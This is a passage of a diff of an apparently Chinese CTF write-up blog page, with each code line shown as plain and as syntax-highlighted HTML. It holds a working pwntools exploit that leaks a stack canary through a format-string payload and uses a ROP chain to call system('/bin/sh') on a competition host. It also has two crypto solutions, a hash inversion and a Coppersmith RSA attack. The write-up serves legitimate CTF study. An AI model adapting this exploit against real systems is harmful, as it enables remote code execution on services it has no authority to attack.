+断点断在 PyImport_ImportModule<span class="token operator">+</span><span class="token number">4</span>，然后一直往下运行看看那个包导入了 <span class="token punctuation">.</span>so
 
 exp 如下
 
-from pwn import *
-from LibcSearcher import*
-p = remote('101.201.35.76', 20611)
-context(os = 'linux', arch = 'amd64', log_level = 'debug')
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.201.35.76'</span><span class="token punctuation">,</span> <span class="token number">20611</span><span class="token punctuation">)</span>
+context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
 
-p.sendline('0')
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>
 
-p.recvuntil('0x')
-s = p.recv(12)
-get_info_addr = int(s,16)
-log.info("get_info_addr: " + hex(get_info_addr))
-libc_base = get_info_addr - 0x68B0
-log.info('libc_base: ' + hex(libc_base))
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
+s <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>
+get_info_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"get_info_addr: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>get_info_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> get_info_addr <span class="token operator">-</span> <span class="token number">0x68B0</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-# 5+(0x118-0x10)/0x8
-payload = '%p'*37 + 'flag' + '%p'
-p.sendline(payload)
-p.recvuntil('flag')
-p.recvuntil('0x')
-leak_canary = p.recv(16)
-leak_canary = int(leak_canary,16)
-log.info('leak_canary: ' + hex(leak_canary))
+<span class="token comment" spellcheck="true"># 5+(0x118-0x10)/0x8</span>
+payload <span class="token operator">=</span> <span class="token string">'%p'</span><span class="token operator">*</span><span class="token number">37</span> <span class="token operator">+</span> <span class="token string">'flag'</span> <span class="token operator">+</span> <span class="token string">'%p'</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
+leak_canary <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
+leak_canary <span class="token operator">=</span> int<span class="token punctuation">(</span>leak_canary<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'leak_canary: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>leak_canary<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-pop_rdi_ret = libc_base + 0x3f8f
-pop_rsi_ret = libc_base + 0x3cd9
-main = libc_base + 0x99F0
-puts_plt = libc_base + 0x3710
-puts_got = libc_base + 0x16078
+pop_rdi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3f8f</span>
+pop_rsi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3cd9</span>
+main <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x99F0</span>
+puts_plt <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3710</span>
+puts_got <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x16078</span>
 
-payload =  'a'*0x108 + p64(leak_canary) + 'a'*8
-payload += p64(pop_rdi_ret)
-payload += p64(puts_got)
-payload += p64(puts_plt)
-payload += p64(main)
-p.sendline(payload)
+payload <span class="token operator">=</span>  <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leak_canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 
-puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
+puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-libc = LibcSearcher('puts',puts_addr)
-libc_base2 = puts_addr - libc.dump('puts')
-log.info('libc_base2: ' + hex(libc_base2))
-binsh = libc_base2 + libc.dump('str_bin_sh')
-system = libc_base2 + libc.dump('system')
+libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>
+libc_base2 <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'libc_base2: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+binsh <span class="token operator">=</span> libc_base2 <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>
+system <span class="token operator">=</span> libc_base2 <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
 
-p.sendline('a')
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
 
-ret = libc_base + 0x9A93
-payload = 'a'*0x108 + p64(leak_canary) + 'a'*8
-payload += p64(ret)
-payload += p64(pop_rdi_ret)
-payload += p64(binsh)
-payload += p64(system)
-p.sendline(payload)
+ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x9A93</span>
+payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leak_canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 
-p.interactive()
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
 <h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="strange-hash"><a href="#strange-hash" class="headerlink" title="strange_hash"></a>strange_hash</h3><p>注意到没验证num tuple长度，直接求逆问题然后在得到的三元组后加一位0就行。</p>
-<pre class=" language-py"><code class="language-py">p = 18446744073709551557
-M = [[8, 56, 280], [18446744073709551543, 18446744073709551467, 18446744073709551123], [7, 35, 155]]
-ConInv = [0x39a3f978106bac2d,0x2940e055f4a33725,0xfda9a7a293fb5bc9]
-Con = [[0x9c52c2de7a9373c4,0xf2135cb886d0fa21,0x957df7f3cd4879e9], [0xd54f837d2738d717,0x400ddf1ffaae436d,0xc2abb601d9a26b07], [0x1904359f1deb3495,0xc21aa09ba52b157b,0x3d45525db1b19a0c], [0xed66cf26a65afc73,0x1cee569b29ffa476,0x3da45abf4304849], [0x1c1a642fa0f3d96d,0x59a1c4fbb96aec86,0xa18e9ca93163f63d], [0x9621ec9fbcb402be,0xd69468353c31bee0,0x50655b3f20fee3b8], [0x109cde7a61c2c195,0x5ebbd9e98be60c59,0x334d2d15f6e43190], [0x47af2b0d63901977,0x67ace097bf8c6f34,0xb87da3296b70d64b], [0x52d6344b38f49899,0xad5773add31420e1,0xecd0b7480f8c8095], [0xe2afb6d20f5decda,0xb1767d8be7d1371,0x902fd6806a0ef4db]]
+<pre class=" language-python"><code class="language-python">p <span class="token operator">=</span> <span class="token number">18446744073709551557</span>
+M <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">280</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">18446744073709551543</span><span class="token punctuation">,</span> <span class="token number">18446744073709551467</span><span class="token punctuation">,</span> <span class="token number">18446744073709551123</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+ConInv <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x39a3f978106bac2d</span><span class="token punctuation">,</span><span class="token number">0x2940e055f4a33725</span><span class="token punctuation">,</span><span class="token number">0xfda9a7a293fb5bc9</span><span class="token punctuation">]</span>
+Con <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0x9c52c2de7a9373c4</span><span class="token punctuation">,</span><span class="token number">0xf2135cb886d0fa21</span><span class="token punctuation">,</span><span class="token number">0x957df7f3cd4879e9</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0xd54f837d2738d717</span><span class="token punctuation">,</span><span class="token number">0x400ddf1ffaae436d</span><span class="token punctuation">,</span><span class="token number">0xc2abb601d9a26b07</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0x1904359f1deb3495</span><span class="token punctuation">,</span><span class="token number">0xc21aa09ba52b157b</span><span class="token punctuation">,</span><span class="token number">0x3d45525db1b19a0c</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0xed66cf26a65afc73</span><span class="token punctuation">,</span><span class="token number">0x1cee569b29ffa476</span><span class="token punctuation">,</span><span class="token number">0x3da45abf4304849</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0x1c1a642fa0f3d96d</span><span class="token punctuation">,</span><span class="token number">0x59a1c4fbb96aec86</span><span class="token punctuation">,</span><span class="token number">0xa18e9ca93163f63d</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0x9621ec9fbcb402be</span><span class="token punctuation">,</span><span class="token number">0xd69468353c31bee0</span><span class="token punctuation">,</span><span class="token number">0x50655b3f20fee3b8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0x109cde7a61c2c195</span><span class="token punctuation">,</span><span class="token number">0x5ebbd9e98be60c59</span><span class="token punctuation">,</span><span class="token number">0x334d2d15f6e43190</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0x47af2b0d63901977</span><span class="token punctuation">,</span><span class="token number">0x67ace097bf8c6f34</span><span class="token punctuation">,</span><span class="token number">0xb87da3296b70d64b</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0x52d6344b38f49899</span><span class="token punctuation">,</span><span class="token number">0xad5773add31420e1</span><span class="token punctuation">,</span><span class="token number">0xecd0b7480f8c8095</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0xe2afb6d20f5decda</span><span class="token punctuation">,</span><span class="token number">0xb1767d8be7d1371</span><span class="token punctuation">,</span><span class="token number">0x902fd6806a0ef4db</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
 
-M = matrix(GF(p), M)
-u = vector(Zmod(p), [1, 1, 0])
-phi = M.multiplicative_order()
-d = inverse_mod(3, phi)
+M <span class="token operator">=</span> matrix<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> M<span class="token punctuation">)</span>
+u <span class="token operator">=</span> vector<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+phi <span class="token operator">=</span> M<span class="token punctuation">.</span>multiplicative_order<span class="token punctuation">(</span><span class="token punctuation">)</span>
+d <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
 
-def mypow(c, a):
-    res = []
-    for i in c:
-        res.append(pow(i, a, p))
-    return vector(GF(p), res)
+<span class="token keyword">def</span> <span class="token function">mypow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span>
+        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>i<span class="token punctuation">,</span> a<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span>
 
-c3 = vector(GF(p), Con[3])
-c2 = vector(GF(p), Con[2])
-c1 = vector(GF(p), Con[1])
-c0 = vector(GF(p), Con[0])
-ni = M^(-1)
+c3 <span class="token operator">=</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> Con<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+c2 <span class="token operator">=</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> Con<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+c1 <span class="token operator">=</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> Con<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+c0 <span class="token operator">=</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> Con<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+ni <span class="token operator">=</span> M<span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
 
-u = mypow((u-c3)*ni, 3)
-u = mypow((u-c2)*ni, d)
-u = mypow((u-c1)*ni, 3)
-u = mypow((u-c0)*ni, d)-vector(GF(p), ConInv)
+u <span class="token operator">=</span> mypow<span class="token punctuation">(</span><span class="token punctuation">(</span>u<span class="token operator">-</span>c3<span class="token punctuation">)</span><span class="token operator">*</span>ni<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
+u <span class="token operator">=</span> mypow<span class="token punctuation">(</span><span class="token punctuation">(</span>u<span class="token operator">-</span>c2<span class="token punctuation">)</span><span class="token operator">*</span>ni<span class="token punctuation">,</span> d<span class="token punctuation">)</span>
+u <span class="token operator">=</span> mypow<span class="token punctuation">(</span><span class="token punctuation">(</span>u<span class="token operator">-</span>c1<span class="token punctuation">)</span><span class="token operator">*</span>ni<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
+u <span class="token operator">=</span> mypow<span class="token punctuation">(</span><span class="token punctuation">(</span>u<span class="token operator">-</span>c0<span class="token punctuation">)</span><span class="token operator">*</span>ni<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token operator">-</span>vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> ConInv<span class="token punctuation">)</span>
 
-print(u)
-'''
+<span class="token keyword">print</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span>
+<span class="token triple-quoted-string string">'''
 (5329202944861711021, 10075872277090249537, 6598944197421011167,0 )
-'''
+'''</span>
 </code></pre>
 <h3 id="lift"><a href="#lift" class="headerlink" title="lift"></a>lift</h3><p>ged-251=0 mod p^4，coppersmith取beta=4/6，epsilon=0.03求解d mod p^4，利用ed-1和n做gcd分解n，最后有限域开根做lift即可</p>
-<pre class=" language-Python"><code class="language-Python">from Crypto.Util.number import *
-from gmpy2 import iroot
-n = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077
-e = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039
-c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> iroot
+n <span class="token operator">=</span> <span class="token number">108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077</span>
+e <span class="token operator">=</span> <span class="token number">3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039</span>
+c <span class="token operator">=</span> <span class="token number">72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162</span>
 
-PR.<x> = PolynomialRing(Zmod(n))
-f = e*x-251
-f = f.monic()
+PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
+f <span class="token operator">=</span> e<span class="token operator">*</span>x<span class="token number">-251</span>
+f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-d = f.small_roots(X=2^256, beta=0.63, epsilon=0.03)[0]
-p = iroot(GCD(e*d-251, n), 4)[0]
-q = n//p^5
-assert n == p^5*q
-phi = (p-1)*p^4*(q-1)
-d = inverse_mod(e//251, phi)
-cm = ZZ(pow(c, d, n))
+d <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">256</span><span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.63</span><span class="token punctuation">,</span> epsilon<span class="token operator">=</span><span class="token number">0.03</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+p <span class="token operator">=</span> iroot<span class="token punctuation">(</span>GCD<span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token number">-251</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+q <span class="token operator">=</span> n<span class="token operator">//</span>p<span class="token operator">^</span><span class="token number">5</span>
+<span class="token keyword">assert</span> n <span class="token operator">==</span> p<span class="token operator">^</span><span class="token number">5</span><span class="token operator">*</span>q
+phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span>p<span class="token operator">^</span><span class="token number">4</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>
+d <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span>e<span class="token operator">//</span><span class="token number">251</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
+cm <span class="token operator">=</span> ZZ<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-F1 = Zmod(p^3)
-F2 = Zmod(q)
+F1 <span class="token operator">=</span> Zmod<span class="token punctuation">(</span>p<span class="token operator">^</span><span class="token number">3</span><span class="token punctuation">)</span>
+F2 <span class="token operator">=</span> Zmod<span class="token punctuation">(</span>q<span class="token punctuation">)</span>
 
-root1 = F1(cm).nth_root(251, all=True)
-root2 = F2(cm).nth_root(251, all=True)
+root1 <span class="token operator">=</span> F1<span class="token punctuation">(</span>cm<span class="token punctuation">)</span><span class="token punctuation">.</span>nth_root<span class="token punctuation">(</span><span class="token number">251</span><span class="token punctuation">,</span> all<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+root2 <span class="token operator">=</span> F2<span class="token punctuation">(</span>cm<span class="token punctuation">)</span><span class="token punctuation">.</span>nth_root<span class="token punctuation">(</span><span class="token number">251</span><span class="token punctuation">,</span> all<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
 
 
-for i in root1:
-    for j in root2:
-        m = ZZ(crt([ZZ(i), ZZ(j)], [p^3, q]))
-        if m.nbits() <= 512:
-            m = long_to_bytes(m)
-            print(m)
+<span class="token keyword">for</span> i <span class="token keyword">in</span> root1<span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> root2<span class="token punctuation">:</span>
+        m <span class="token operator">=</span> ZZ<span class="token punctuation">(</span>crt<span class="token punctuation">(</span><span class="token punctuation">[</span>ZZ<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> ZZ<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token operator">^</span><span class="token number">3</span><span class="token punctuation">,</span> q<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> m<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">512</span><span class="token punctuation">:</span>
+            m <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
 </code></pre>
 
                 
@@ -1379,7 +1380,7 @@ for i in root1:
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">31.1k</span>
+                        class="white-color">43.7k</span>
             
             
             
